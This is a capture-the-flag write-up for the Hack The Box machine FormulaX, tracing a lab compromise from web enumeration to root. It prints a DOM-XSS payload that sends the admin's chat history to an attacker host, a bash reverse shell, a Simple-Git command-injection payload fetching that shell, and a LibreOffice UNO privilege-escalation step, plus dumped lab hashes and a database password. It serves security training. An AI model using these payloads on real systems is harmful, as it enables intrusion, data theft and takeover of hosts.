# HTB - FormulaX
### TL;DR
This is an Ubuntu 22.04 machine running a chat bot accesible via web page. The site is vulnerable to DOM-based XSS, which once exploited allows discovery of a hidden subdomain made with Simple-Git 3.14. Turns out, this Simple-Git version is vulnerable (CVE-2022-25912) which leads to a first reverse shell in the system, and enumerating contents of the local MongoDB we disclose credentials to move laterally to another user with rigths to read the user flag. Regarding privilege escalation, first we need to move laterally to another user by abusing functionalities of a running LibreNMS server, then check `sudo` configuration, where a Libre Office binary, with a vulnerable Apache UNO API, is enabled to be executed as root.
### KEYWORDS
DOM-XSS, DOM Invader, Simple-Git, CVE-2022-25912, MongoDB, LibreNMS, Libre Office, Apache UNO API, sudo.
### REFERENCES
https://www.youtube.com/playlist?list=PL4cUxeGkcC9gfoKa5la9dsdCNpuey2s-V<br>
https://portswigger.net/web-security/cross-site-scripting/dom-based<br> https://portswigger.net/web-security/dom-based<br>
https://www.cvedetails.com/cve/CVE-2022-25912<br>
https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221<br>
https://www.librenms.org<br>
https://github.com/librenms/librenms<br>
https://community.librenms.org<br>
https://0day.today/exploit/32356<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-09 14:03 EST
Nmap scan report for 10.10.11.6
Host is up, received user-set (0.092s latency).
Not shown: 51327 closed tcp ports (conn-refused), 14206 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 18.43 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p22,80 -sV -sC -Pn -vv -n 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-09 14:08 EST
Nmap scan report for 10.10.11.6
Host is up, received user-set (0.14s latency).
Scanned at 2024-03-09 14:08:21 EST for 18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5fb2cd54e447d10e9e8135923cd6a3cb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG8rGSIhEBCPw+TyWPlQnCQOhuDZwBuKTDmhMvwgTYIpqvWGe1d5Mtt2LA1hpEl/0cYRCmDfmsgs4xWffPDaK48=
|   256 b9f00ddc057bfafb91e6d0b459e6db88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDxdSOINZhnpi+VKvc9X6X/yYgzl88VdajTFgliPg6Jl
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 496A37014B10519386B2904D1B3086BE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-cors: GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds
```
Fuzz web folders.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -fc 404 -u http://$target/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.6/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

ADMIN                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 166ms]
Admin                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 115ms]
Scripts                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 324ms]
admin                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 507ms]
chat                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 508ms]
contact_us              [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 360ms]
favicon.ico             [Status: 200, Size: 34494, Words: 20, Lines: 82, Duration: 409ms]
img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 382ms]
logout                  [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 437ms]
restricted              [Status: 301, Size: 187, Words: 7, Lines: 11, Duration: 1798ms]
scripts                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 810ms]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 720ms]
:: Progress: [4713/4713] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:38] :: Errors: 0 ::
```
Enumerate the web server with Firefox, a login portal comes into view.

![formulax Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/925c7114-7b73-4397-81ac-46047bdcec04)

Create a new account and log in. In the chatbox, it seems we can issue the command `help` to see "some buildin commands". Also, it seems we can see a conversation log by typing the command `history`

![formulax Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ae283acb-5752-4d5c-ba84-20a048e623d6)

In addition to this, there is a "Contact Us" form which appearently puts us in touch with the site administrator.
### USER
In the enumeration phase we have found out the `history` command permits us to see our previous commands, but it would be great if we could see another user's commands (particularly admin commands).<br>
<br>
Let's investigate if the chat application and the contact form could be points of entry for DOM-based XSS. This vulnerability arises when an application contains JavaScript code executed client-side in the user browser, and we are able to inject and execute malicious code to manipulate the DOM.<br>
<br>
The DOM (Document Object Model) is a hierarchical tree representation of the page HTML elements created by the browser when a web page is loaded. It is useful for developers since they can manipulate web page elements interacting with the DOM with a scripting language such as JavaScript (via developers API and browser console). Here is a good tutorial on the DOM manipulation with JavaScript: https://www.youtube.com/playlist?list=PL4cUxeGkcC9gfoKa5la9dsdCNpuey2s-V<br>
<br>
When user's JavaScript input is handled insecurely, it can enable DOM-based vulnerabilities; for example, that's the case for sites that take an attacker-controllable value (source), and passes it into a dangerous function (sink). Good info about DOM-based vulnerabilities can be found here: https://portswigger.net/web-security/cross-site-scripting/dom-based, and here: https://portswigger.net/web-security/dom-based <br>
<br>
In order to find DOM-based vulnerabilities we will use Burpsuite's DOM Invader. Open Burpsuite's integrated browser and enable the DOM Invader extension, then navigate to the chat application and open the developer options (F12). In the DOM Invader tab, click on "inject forms", the tool will automatically inject the canary in any web page form. Finally, click on "submit", DOM Invader will automatically check if the source hits any sink function.

![formulax8 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/098ef58c-83af-447d-b190-c82d5c01de52)

In this case, DOM invader reports the sink function `innerHTML`. Click on the stack trace link to find the function location.

![formulax9 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b61ebdad-bed5-4a82-95f7-4d8f4eb00806)

In the console, a vulnerable script is reported in http://10.10.11.6/restricted/chat.js

![formulax10 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/f2c8c1d2-c403-4d14-bde7-dac563608ed2)

Inspecting the code, it seems we have found the chat application source code, which is vulnerable to DOM-based XSS.

![formulax11 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/7322249e-3524-4f23-99ca-15cd0474ec9f)

There you can see the sink function `innerHTML` previously reported by DOM Invader. Basically, this JavaScript application takes the user message and, if not empty, send it to the server (`socket.emit`).<br>
<br>
Once a DOM-XSS vulnerability has been confirmed, we have to elaborate ways of exploiting it. Let's recapitulate what we have so far:
- In the `chat.js` code we have seen how to send messages to the server.
- We know this application is vulnerable to DOM-XSS, meaning we can manipulate the DOM and therefore the page code.
- Also, the "Contact Us" can be used to send messages which will be read by the admin.

Let's prepare and send an script in the "Contact Us" form which, once read by the admin, will dump the admin's history, and send it to a web server controlled by us. Since we have already disclosed the `chat.js` code used to send messages to the server, we will just copy paste the lines we need.
```javascript
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function() {
	const res = axios.get(`/user/api/chat`);
	const socket = io('/',{withCredentials: true});
	socket.on('message', (my_message) => {
		fetch("http://10.10.xxx.xxx/?d=" + my_message)
		});
	socket.emit('client_message', 'history');
});
```
Start a Python HTTP server, then  minify the script, base64-encode and send it with Repeater using the `atob()` JavaScript function (remember to add escape characters before the " character).

![formulax1 1 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/bfb42e61-323e-48c5-bb95-aedcf1878e12)

The admin's chat history is received on your HTTP server.

![formulax2 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/663ae209-0b1e-4387-8580-99268a5b44d2)

URL-decode the received history, a subdomain called http://dev-git-auto-update.chatbot.htb is revealed.

![112Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/fccee468-5c03-4ceb-818f-e3687be6cc0c)

Add to hosts file and browse with Firefox.

![formulax888 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/f8981efa-ba71-4ff6-84bd-ffeab68206d8)

The site is made with Simple-Git 3.14. You can find it has a history of CVEs, the most interesting is this: https://www.cvedetails.com/cve/CVE-2022-25912, and the associated POC: https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221<br>
<br>
Serve an `index.html` file containing a reverse shell.
```markdown
> cat index.html
bash -i >& /dev/tcp/10.10.xxx.xxx/1919 0>&1
```
Back to Firefox, enter the POC payload `ext::sh -c curl% http://10.10.xxx.xxx|bash` in the "Enter Remote Git URL".<br>
<br>
A reverse shell for user `www-data` is received on port 1919.

![formulax5 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/75f326a7-c146-4bb8-aa7a-29b47e2ee4cb)

From this shell, navigate to `/var/www/app/configuration` and enumerate the file `connect_db.js`
```markdown
> cat connect_db.js 
import mongoose from "mongoose";

const connectDB= async(URL_DATABASE)=>{
    try{
        const DB_OPTIONS={
            dbName : "testing"
        }
        mongoose.connect(URL_DATABASE,DB_OPTIONS)
        console.log("Connected Successfully TO Database")
    }catch(error){
        console.log(`Error Connecting to the ERROR ${error}`);
    }
}
```
Looks like an script to connect to a Mongo database called `testing`. Use local client to connect to Mongo service, then switch to `testing` database and enumerate the collections. Dump the `users` collection.
```markdown
> mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("221fb43c-d4b3-4cca-9ade-47aa625e7078") }
MongoDB server version: 4.4.8

> use testing
switched to db testing

> show collections
messages
users

> db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAxNTM0NzZ9.kTx3Ez_m5PaesvXkgdwQ7vKMz5liuieUyfK5STpOdFE", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
{ "_id" : ObjectId("65eed706b9dd9f941a10536e"), "name" : "crilin", "email" : "hacker@crilin", "password" : "$2b$10$NCOGN44Y1JWdtHrQ5RQLpeaH4rF/NJJol/1UvdZ/BKt/q0DhS8PXe", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVlZDcwNmI5ZGQ5Zjk0MWExMDUzNmUiLCJpYXQiOjE3MTAxNTE0NDF9._o6bDKbnUekJhTlM2e8DTgrCIt7h9SsSFEexCAUYDnw", "__v" : 0 }
{ "_id" : ObjectId("65eed910b9dd9f941a105827"), "name" : "tede", "email" : "tede@tede.com", "password" : "$2b$10$ZsmQWWwIpSkk3zZtgNx5y.w.ILjgg1u2QYwMc5vhjW8rKRLUalSwm", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVlZDkxMGI5ZGQ5Zjk0MWExMDU4MjciLCJpYXQiOjE3MTAxNTI4OTl9.CJk1o-WF8g_cb0fGREN4AEI9JNS1aJyEvqpZ9jTJz7c", "__v" : 0 }
{ "_id" : ObjectId("65eedef4b9dd9f941a1065ae"), "name" : "asdf", "email" : "huhu@huhu.de", "password" : "$2b$10$lPWgOhe.H3tDoP0wXUtn/u8moanNUEH5MhFyNyZ6QkU2DiSlCxQs2", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVlZGVmNGI5ZGQ5Zjk0MWExMDY1YWUiLCJpYXQiOjE3MTAxNTM0NzF9.xAn4K8c2w3hvuqxprmiwFjOk8g6vM31fBL1YYeLfP7M", "__v" : 0 }
```
The password of user `franky_dorky` is crackable with `john`.
```markdown
> john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```
Finally, use this password to SSH in as `frank_dorky`

![formulax4 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b8ad5e16-c22a-4e99-9c69-8b151b1e7863)

Use this shell to retrieve the user flag.
### ROOT
Start from the low-priv shell and take the opportunity to enumerate the system.
```markdown
> uname -a && cat /etc/os-release
Linux formulax 5.15.0-97-generic #107-Ubuntu SMP Wed Feb 7 13:26:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```
List the active connections, notice there is something listening on port 3000.
```markdown
> netstat -lnput
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2002          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33079         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:162             0.0.0.0:*                           -                   
udp6       0      0 :::162                  :::*                                -
```
Quick enumerate port 3000, looks like a login portal.
```markdown
> curl localhost:3000
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://localhost:3000/login'" />

        <title>Redirecting to http://localhost:3000/login</title>
    </head>
    <body>
        Redirecting to <a href="http://localhost:3000/login">http://localhost:3000/login</a>.
    </body>
</html>
```
Set a port forwarding in place to bring the port to your machine.
```markdown
> ssh -L 3000:127.0.0.1:3000 frank_dorky@chatbot.htb
```
Browse the site with Firefox, a LibreNMS login comes into view.

![113Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/cbd71eef-801e-446f-ab04-82fcfe9d0533)

According to developer, this is "an auto-discovering PHP/MySQL/SNMP based network monitoring" (https://www.librenms.org/), and the source code is available at: https://github.com/librenms/librenms<br>
<br>
Investigating in the support forums (https://community.librenms.org), they say you can run commands from the `/opt/librenms` directory. For example you can enumerate the version with `validate.php`
```markdown
> ./validate.php

===========================================
Component | Version
--------- | -------
LibreNMS  | 22.10.0 (2022-10-18T04:47:05+00:00)
DB Schema | 2022_09_03_091314_update_ports_adsl_table_with_defaults (246)
PHP       | 8.1.2-1ubuntu2.14
Python    | 3.10.12
Database  | MariaDB 10.6.16-MariaDB-0ubuntu0.22.04.1
RRDTool   | 1.7.2
SNMP      | 5.9.1
===========================================

[OK]    Installed from package; no Composer required
[FAIL]  'install_dir' config setting is not set correctly. [FIX] It should probably be set to: /opt/librenms
```
So the version running is 22.10.0. Back in GitHub, download a copy of the source code package version 22.10.0 and inspect the source code. There are two `.php` commands that catch the attention: `adduser.php` and `config_to_json.php`<br>
<br>
Disclose the configuration data by executing `/opt/librenms/config_to_json.php`
```markdown
> ./config_to_json.php

{"install_dir":"\/opt\/librenms","active_directory":{"users_purge":0},"addhost_alwayscheckip":false,"alert":{"ack_until_clear":false,"admins":true,"default_copy":true,"default_if_none":false,"default_mail":false,"default_only":true,"disable":false,"fixed-contacts":true,"globals":true,"syscontact":true,"transports":{"mail":5},"tolerance_window":5,"users":false,"macros":{"rule":{"bill_quota_over_quota":"((%bills.total_data \/ %bills.bill_quota)*100) && %bills.bill_type = \"quota\"","bill_cdr_over_quota":"((%bills.rate_95th \/ %bills.bill_cdr)*100) && %bills.bill_type = \"cdr\"","component":"(%component.disabled = 0 && %component.ignore = 0)","component_critical":"(%component.status = 2 && %macros.component)","component_normal":"(%component.status = 0 && %macros.component)","component_warning":"(%component.status = 1 && %macros.component)","device":"(%devices.disabled = 0 && %devices.ignore = 
[…]
flow-monitor":false,"cisco-remote-access-monitor":false,"cisco-cef":false,"slas":false,"cisco-mac-accounting":false,"cipsec-tunnels":false,"cisco-ace-loadbalancer":false,"cisco-ace-serverfarms":false,"cisco-asa-firewall":false,"cisco-voice":false,"cisco-cbqos":false,"cisco-otv":false,"cisco-qfp":false,"cisco-vpdn":false,"nac":false,"netscaler-vsvr":false,"aruba- implemented","diskio.c"],"syslog_purge":30,"top_devices":true,"top_ports":true,"traceroute":"traceroute","transit_descr":["transit"],"twofactor":"false","twofactor_lock":"0","unix-agent-connection-time-out":10,"unix-agent-read-time-out":10,"unix-agent":{"connection-timeout":10,"port":6556,"read-timeout":10},"update":1,"update_channel":"master","uptime_warning":86400,"user":"librenms","vertical_summary":0,"virsh":"\/usr\/bin\/virsh","warn":{"ifdown":true},"warn_colour":"#ffeeee","warn_colour_alt":"#ffcccc","web_mouseover":true,"webui":{"availability_map_box_size":165,"availability_map_compact":false,"availability_map_sort_status":false,"availability_map_use_device_groups":false,"custom_css":[],"default_dashboard_id":0,"dynamic_graphs":false,"global_search_result_limit":8,"graph_stacked":false,"graph_type":"png","min_graph_height":300},"whois":"\/usr\/bin\/whois","xirrus_disable_stations":false,"log_dir":"\/opt\/librenms\/logs","distributed_poller_name":"formulax","validation":{"encryption":{"test":"eyJpdiI6IlJQOG52aUtyUGFZK05SR295TnVaV3c9PSIsInZhbHVlIjoiUXJQRmZUTk9ENWFyR1dkVGxtNGQ1QT09IiwibWFjIjoiOWUxMDA4ZDQ3ZjMzMDI5ZDIxNGMzNWNkNWYwZmViZjE3YTU1YTI0ZGRlZDFkZTYxYmVjNDJkZmFmMDEyODMyZiIsInRhZyI6IiJ9"}},"base_url":"\/","applied_site_style":"light","html_dir":"\/opt\/librenms\/html","rrd_dir":"\/opt\/librenms\/rrd","mib_dir":"\/opt\/librenms\/mibs","log_file":"\/opt\/librenms\/logs\/librenms.log","plugin_dir":"\/opt\/librenms\/html\/plugins","temp_dir":"\/tmp","irc_nick":"LibreNMS","irc_chan":["##librenms"],"page_title_suffix":"LibreNMS","time":{"now":1710156300,"onehour":1710152700,"fourhour":1710141900,"sixhour":1710134700,"twelvehour":1710113100,"day":1710069900,"twoday":1709983500,"week":1709551500,"twoweek":1708946700,"month":1707477900,"twomonth":1704799500,"threemonth":1702121100,"sixmonth":1694085900,"year":1678620300,"twoyear":1647084300},"db_host":"localhost","db_name":"librenms","db_user":"kai_relay","db_pass":"mychemicalformulaX","db_port":"3306","db_socket":""}f
```
Use this credential to open an SSH session for user `kai_relay`. In this shell, verify `sudo` configuration for `kai_relay`
```markdown
> sudo -l

Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset,
    timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh

> cat /usr/bin/office.sh 

#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
```
This `/usr/bin/soffice` Libre Office binary launches the `calc` application (the Libre Office spreadsheet program, similar to Excel).<br>
<br>
The flag `--accept="socket,host=localhost,port=2002;urp;"` enables a socket for remote communication with Libre Office, listening on localhost (the same machine) at port 2002 using URP (UNO remote protocol).<br>
<br>
The flag `--headless` runs Libre Office in "headless" mode, meaning it operates without a graphical user interface (GUI).<br>
<br>
In summary, the command launches Libre Office's `calc` and sets up a socket connection on port 2002 for batch processing, automation, or scripting tasks.<br>
<br>
Looking for exploits we come across this one: https://0day.today/exploit/32356<br>
<br>
The exploit needs to be modified in the last line, just add the executable you want to be run as root. In out case, it will be an `msfvenom` elf shell which we would have previously transferred to the host in path `/var/tmp/shell`
```markdown
shell_execute.execute("/var/tmp/shell", "",1)
```
Then transfer the `exploit.py` to the host and execute the `office.sh` shell script with `sudo` to initiate the libreoffice server.
```markdown
sudo /usr/bin/office.sh
```
Now run the exploit.
```markdown
python3 /var/tmp/exploit.py
```
A reverse shell is received on the listener.

![formulax6 Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/df8609c8-0f5e-47e0-8f21-9efefd02725e)

You are root.
